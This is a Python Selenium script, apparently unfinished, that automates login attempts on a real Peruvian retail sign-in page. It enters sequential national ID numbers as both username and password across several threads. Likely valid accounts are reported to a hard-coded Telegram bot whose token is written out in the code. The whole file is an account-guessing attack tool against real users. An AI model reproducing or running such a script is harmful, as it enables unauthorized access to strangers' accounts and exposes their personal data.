from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import NoSuchElementException
from os import system
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException

from selenium.common.exceptions import ElementClickInterceptedException, TimeoutException, ElementNotInteractableException
import time, os, argparse, undetected_chromedriver as uc, requests, threading, random, base64, sys

#from concurrent.futures import ThreadPoolExecutor
from threading import Thread, Barrier
from requests import get
from selenium.webdriver.firefox.options import Options
#from selenium.webdriver.firefox.service import Service
#import telegram
from colorama import init,Fore,Back,Style


def OperacionMasacre():

	#Abriendo el navegador
	#global driver
	firefox_options = Options()
	firefox_options.add_argument('--window-size=800,800')
	firefox_options.add_argument("--headless")
	driver = webdriver.Firefox(executable_path = "geckodriver.exe", options = firefox_options)
	url = "https://cloudintercorpretail.pe/iniciar-sesion"
	driver.get(url)
	#os.system("cls")
	print(driver)
	#print("\n\n ---->  Cargando...\n")
	global dni
	while(True):
		
		wait0 = WebDriverWait(driver,10)
		wait0.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="submit"]')))

		path_ventanaError= '/html/body/div[2]/div/div/snack-bar-container'
		
		p = "pipipipipippiippipipipipipipip¿ipippip"

		#user = str(dni)
		wait0.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="username"]')))
		
		driver.find_element(By.XPATH,'//*[@id="username"]').clear()
		driver.find_element(By.XPATH,'//*[@id="username"]').send_keys(str(dni)) # Poniendo el usuario

		driver.find_element(By.XPATH,'//*[@id="password"]').clear()
		driver.execute_script(f'document.getElementById("password").type={vacio};')
		driver.find_element(By.XPATH,'//*[@id="password"]').send_keys(str(dni)) # Poniendo el usuario

		contador = 0
		while(True):
			try:
				time.sleep(0.1)
				contador = contador + 1
				#wait0.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="submit"]')))
				driver.find_element(By.XPATH ,'//*[@id="submit"]').click()  #Click en ingresar
				wait0.until(EC.visibility_of_element_located((By.XPATH,path_ventanaError))) #esperando ventana roja
				p = driver.find_element(By.XPATH,path_ventanaError).text
				break
			except Exception as e:
				if contador > 100:
					bot.send_message(chat_id=chat_id, text = "Posible: "+ str(dni))
					input("Puede cher"+ str(dni))


		print("-->"+p)
		print("[+] "+ str(dni))
		dni = dni + 1
		#input("Next")



if __name__ == '__main__':

	system('mode con: cols=90 lines=60')
	init()
	os.system("cls")

	bot_token = '5689750548:AAHMDwwtLC6_ylkraqLHMO5Bt85HxJRqRF0'
	chat_id = '1850445278'
	bot = telegram.Bot(token=bot_token)

	ip =get("https://api.ipify.org/").text
	#print("your ip :", ip)
	#bot.send_message(chat_id=chat_id, text = "Comenzando oechsle: "+ ip)

	#ipAcceso = ip.find('190.42.48.8') #black
	#ipAcceso = ip.find('190.42.4') #
	#print(ipAcceso)
	ipAcceso = 2
	#if ipAcceso < 0:
		#print(Fore.RED)
		#print("Acceso no autorizado csm")
		#print(ip)

		#input("Enter para cerrar.")
		#input()


	if ipAcceso >= 0:
		#Paths
		path_Usuario ='//*[@id="username"]'
		path_contrasenia= '//*[@id="password"]'
		#id_contrasenia = 'txtPass'
		path_ventanaError= '/html/body/div[2]/div/div/snack-bar-container'

		path_IniciarSesion = '//*[@id="submit"]'

		vacio = "0"
		workers = 3
		pe = True
		os.system("cls")
		print(Fore.GREEN)
		print("   ──▄────▄▄▄▄▄▄▄────▄───")
		print("   ─▀▀▄─▄█████████▄─▄▀▀──") 
		print("   ─────██─▀███▀─██──────")
		print("   ───▄─▀████▀████▀─▄────")
		print("   ─▀█────██▀█▀██────█▀──\n\n")
		print(Fore.CYAN)
		#numInicio = 40010337
		#numFinal = 50000000
		global dni
		dni = int(input("Numero :  "))
		#numFinal =  input("Numero Final:    ")
		numero_multi = input("Workesr:  ")
		threads = []
		
		#print(Style.RESET_ALL)

		#numInicio = f"{numInicio:08n}"
		#numFinal = f"{numFinal:08n}"
		

		#input("Enter para comenzar")
		#time.sleep(1.5)
		print(Fore.GREEN)
		def proyecto():
			OperacionMasacre()
			print("-------------------------------------------------------------------------")

		
		#Para el bucle		
		for _ in range (int(numero_multi)):
		    i = Thread(target=proyecto)
		    threads.append(i)
		    i.start()     

		for i in threads:
		    i.join()


		print('\a')
		time.sleep(1)
		#driver.close()
		input("Enter para cerrar.")




# No acabado

